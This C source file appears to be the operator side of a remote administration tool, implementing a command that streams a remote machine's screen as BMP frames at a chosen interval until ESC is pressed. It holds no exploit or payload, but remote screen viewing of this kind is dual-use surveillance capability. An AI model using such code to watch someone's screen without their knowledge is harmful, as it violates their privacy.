#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include "server/serv_cmds.h"
#include "net/interface.h"
#include "net/error.h"
#include "logger.h"
#include "types.h"
#include "bmp.h"
#include "sc/sc.h"
#include "sc/error.h"
#include "input.h"

#define SERV_SCREENCAP_MAX_DATA 1980
#define SERV_SCREENCAP_CMD_DATA 0x1
#define SERV_SCREENCAP_END 0x2
#define SERV_SCREENCAP_GOOD 0x3
#define SERV_SCREENCAP_FAILED 0xF
#define SERV_SCREENCAP_STOP 0xBC

#define SERV_SCREENCAP_STOP_KEY 0x1B

typedef struct _serv_screencap_data
{
	uint16 len;
	uint8 data[SERV_SCREENCAP_MAX_DATA];
}SERV_SCREENCAP_DATA;

typedef struct _serv_screencap_info
{
	uint32 width;
	uint32 height;
	uint32 timer;
}SERV_SCREENCAP_INFO;

uint32 serv_SCREENCAP_frames = 0;

int serv_SCREENCAP_screencap(SERV_SCREENCAP_INFO sinfo)
{
	if(net_SendCmd((uint8*)&sinfo, sizeof(SERV_SCREENCAP_INFO), SERV_CMDS_SCREEN_CAP) < 1)
	{
		net_PrintLastError();

		return SERV_CMDS_BREAK;
	}

	uint8* rmsg;

	if(net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES) < 1)
	{
		net_PrintLastError();

		return SERV_CMDS_BREAK;
	}

	if(rmsg[0] == SERV_SCREENCAP_FAILED)
	{
		LOG(LOG_ERR, "Failed to capture screen!\n");
		free(rmsg);

		return SERV_CMDS_GOOD;
	}

	rmsg++;
	SERV_SCREENCAP_INFO *rsinfo = (SERV_SCREENCAP_INFO*)rmsg;
	rmsg--;

	uint32 scSize = rsinfo->width * rsinfo->height * 3;
	uint32 scWidth = rsinfo->width;
	uint32 scHeight = rsinfo->height;

	LOG(LOG_TABLE, "Width: %d\n", scWidth);
	LOG(LOG_TABLE, "Height: %d\n", scHeight);
	LOG(LOG_TABLE, "Color depth: 24\n");
	LOG(LOG_TABLE, "Size: ");

	if(scSize / (1024 * 1024 * 1024))
	{
		printf("%.2f GB\n", (double)scSize / (1024.0 * 1024.0 * 1024.0));
	}else if(scSize / (1024 * 1024)){
		printf("%.2f MB\n", (double)scSize / (1024.0 * 1024.0));
	}else if(scSize / 1024){
		printf("%.2f KB\n", (double)scSize / 1024.0);
	}else{
		printf("%.2f B\n", (double)scSize);
	}

	free(rmsg);

	int bmpHeaderSize = BMP_GET_HEADERSIZE;
	uint8* scData = malloc(scSize + bmpHeaderSize);

	int rv;
	int hasError = 0;
	uint32 scDataI = 0;
	SERV_SCREENCAP_DATA* snData;

	net_SetBuffer(NET_DATA_BUFFSIZE);

	SC_Start();

	if(SC_GetLastError() != SC_ERROR_NO_ERROR)
	{
		LOG(LOG_CRITICAL, "SC failed to start with: 0x%02X\n", SC_GetLastError());
		free(scData);

		if(net_SendEmptyCmd(SERV_SCREENCAP_END) < 1)
		{
			net_PrintLastError();

			return SERV_CMDS_BREAK;
		}

		return SERV_CMDS_GOOD;
	}

	LOG(LOG_INFO, "Hold \"ESC\" to stop capturing!\n");
	int sc_lastError = 0;

	while(1)
	{
		if(input_IsKeyPressed(VK_ESCAPE))
		{
			free(scData);

			if(net_SendEmptyCmd(SERV_SCREENCAP_STOP) < 1)
			{
				net_PrintLastError();
				
				return SERV_CMDS_BREAK;
			}

			LOG(LOG_WAR, "Capturing stoped!\n");

			return SERV_CMDS_GOOD;
		}

		sc_lastError = SC_GetLastError();

		if(sc_lastError != SC_ERROR_NO_ERROR)
		{
			free(scData);

			if(sc_lastError != SC_ERROR_STOPED)
			{
				LOG(LOG_CRITICAL, "SC stoped working with error: 0x%02X\n", sc_lastError);
			}else{
				LOG(LOG_WAR, "SC stoped!\n");
			}

			if(net_SendEmptyCmd(SERV_SCREENCAP_STOP) < 1)
			{
				net_PrintLastError();
				
				return SERV_CMDS_BREAK;
			}

			return SERV_CMDS_GOOD;
		}

		if(net_SendEmptyCmd(SERV_SCREENCAP_GOOD) < 1)
		{
			net_PrintLastError();
			free(scData);

			return SERV_CMDS_BREAK;
		}

		scDataI = bmp_CreateMemBmp(&scData, scWidth, scHeight);

		while((rv = net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES)) > 0)
		{
			if(rmsg[0] == SERV_SCREENCAP_END)
			{
				free(rmsg);
				serv_SCREENCAP_frames++;

				if(serv_SCREENCAP_frames >= 0xFFFFFF)
				{
					serv_SCREENCAP_frames = 0;
				}

				break;
			}else if(rmsg[0] == SERV_SCREENCAP_CMD_DATA){
				rmsg++;
				snData = (SERV_SCREENCAP_DATA*)rmsg;
				rmsg--;

				memcpy(scData + scDataI, snData->data, snData->len);
				scDataI += snData->len;
				free(rmsg);

				if(net_SendEmptyCmd(SERV_SCREENCAP_GOOD) < 1)
				{
					net_PrintLastError();
					free(scData);

					return SERV_CMDS_BREAK;
				}

				continue;
			}else if(rmsg[0] == SERV_SCREENCAP_FAILED){
				free(rmsg);
				hasError = 1;

				break;
			}

			free(rmsg);
		}

		if(hasError)
		{
			LOG(LOG_ERR, "Failed to capture screen!\n");

			break;
		}

		SC_SetImage(scData, scSize + bmpHeaderSize);
		memset(scData, 0, scSize + bmpHeaderSize);
		Sleep(sinfo.timer);
	}

	free(scData);

	return SERV_CMDS_GOOD;
}

int serv_SCREENCAP(char* msg)
{
	if(!SC_CanRun)
	{
		LOG(LOG_ERR, "Missing \"%s\"!\n", SC_LIB_XVR_SC);

		return SERV_CMDS_DONT_SEEDUP;
	}

	int stIdx = 0;
	char* argW;
	char* argH;

	if(!(stIdx = serv_cmds_ExportArg(&msg, &argW, 0)))
	{
		LOG(LOG_ERR, "Invalid arguments!\n");
		free(msg);

		return SERV_CMDS_DONT_SEEDUP;
	}

	if(!(stIdx = serv_cmds_ExportArg(&msg, &argH, stIdx)))
	{
		LOG(LOG_ERR, "Invalid arguments!\n");
		free(argW);
		free(msg);

		return SERV_CMDS_DONT_SEEDUP;
	}

	int len = strlen(msg + stIdx);
	char* timer = malloc(len + sizeof(char));
	memset(timer, 0, len + sizeof(char));
	strcpy(timer, msg + stIdx);
	free(msg);

	int _argW = atoi(argW);
	int _argH = atoi(argH);
	int _timer = atoi(timer);
	free(argW);
	free(argH);

	if(_argW > 100 || _argW < 0)
	{
		LOG(LOG_ERR, "The width value must be between 0 and 100!\n");

		return SERV_CMDS_DONT_SEEDUP;
	}

	if(_argH > 100 || _argH < 0)
	{
		LOG(LOG_ERR, "The height value must be between 0 and 100!\n");

		return SERV_CMDS_DONT_SEEDUP;
	}

	if(_timer < 1)
	{
		LOG(LOG_ERR, "The timer value must be greater than 0\n");
		LOG(LOG_WAR, "Timer set to 1000 ms\n");
		
		return SERV_CMDS_DONT_SEEDUP;
	}

	serv_SCREENCAP_frames = 0;
	SERV_SCREENCAP_INFO sncCap;
	memset(&sncCap, 0, sizeof(SERV_SCREENCAP_INFO));
	sncCap.width = _argW;
	sncCap.height = _argH;
	sncCap.timer = _timer;

	int rv = serv_SCREENCAP_screencap(sncCap);
	SC_Stop();
	net_SetBuffer(NET_BUFFSIZE);

	LOG(LOG_INFO, "Finished with %d frames.\n", serv_SCREENCAP_frames);
	
	return rv;
}